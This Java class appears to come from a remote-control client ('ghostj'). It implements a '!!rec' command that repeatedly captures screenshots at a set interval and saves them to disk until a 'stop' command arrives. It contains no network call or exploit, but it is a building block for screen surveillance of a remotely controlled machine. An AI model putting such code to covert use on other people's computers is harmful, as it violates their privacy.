package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;

import java.io.File;

public class FuncRecord implements AbstractFunc {
    static  AbstractProcessor processor;
    static long sleepTime=1000;
    static int index=0;
    static double clr=0.06;
    static  double szr=0.8;
    public static  Thread recThr=new Thread(()->{
        while (true){
            try {
                processor.start("!!scr rec\\" + (index++) + ".png " + szr + " " + clr+" nosend");
            }catch (Exception e){}
            try {
                Thread.sleep(sleepTime);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    });
    @Override
    public String getFuncName() {
        return "!!rec";
    }

    @Override
    public String[] getParamsModel() {
        return new String[0];
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 1;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        FuncRecord.processor=processor;
        new File("rec").mkdirs();
        if(params[0].equals("start")){
            try{
                sleepTime=Long.parseLong(params[1]);
            }catch (Exception e){
                sleepTime=1000;
            }
            try{
                szr=Double.parseDouble(params[2]);
            }catch (Exception e){
                szr=0.8;
            }
            try{
                clr=Double.parseDouble(params[3]);
            }catch (Exception e){
                clr=0.06;
            }
            recThr=new Thread(()->{
                while (true){
                    try {
                        processor.start("!!scr " + (index++) + ".png " + szr + " " + clr+" nosend");
                    }catch (Exception e){}
                    try {
                        Thread.sleep(sleepTime);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            });
            recThr.start();
        }else if(params[0].equals("stop")){
            recThr.stop();
        }
    }
}
